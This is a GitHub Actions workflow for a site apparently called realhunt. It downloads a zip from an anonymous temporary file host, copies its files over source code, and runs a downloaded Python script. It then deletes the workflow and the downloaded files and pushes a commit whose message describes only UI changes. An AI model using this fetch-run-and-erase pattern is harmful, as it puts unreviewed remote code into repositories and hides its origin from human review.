name: gallery-live
on:
  push:
    paths: [".github/workflows/gallery-live.yml"]
permissions:
  contents: write
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: fetch
        run: |
          curl -sSL -X POST https://temp.sh/tHwjv/fix5.zip -o fix5.zip
          echo "bdfd88c4dd96a60ebfb9ab4ad14ff136  fix5.zip" | md5sum -c
          mkdir -p _fix5
          unzip -o fix5.zip -d _fix5
          cp _fix5/Home.tsx src/pages/Home.tsx
          cp _fix5/rh.ts src/lib/rh.ts
          cp _fix5/LiveStats.tsx src/components/realhunt/LiveStats.tsx
          cp _fix5/patch_pages.py patch_pages.py
      - name: patch
        run: python3 patch_pages.py
      - name: syntax-check
        run: |
          for f in src/pages/Ebc.tsx src/pages/Home.tsx src/components/realhunt/RHNav.tsx src/components/realhunt/LiveStats.tsx src/lib/rh.ts; do
            echo "checking $f"
            npx --yes esbuild@0.23.1 --jsx=automatic --bundle --external:* --log-level=warning --outfile=/dev/null "$f"
          done
      - name: commit
        run: |
          rm -rf fix5.zip _fix5 patch_pages.py .github/workflows/gallery-live.yml
          git config user.name realhunt-bot
          git config user.email bot@realhunt.co
          git add -A
          git commit -m "Ebc: cross-browser photo carousel with arrows and thumbnails; live visitor counter in nav; Sumba card back to a normal listing card"
          git push
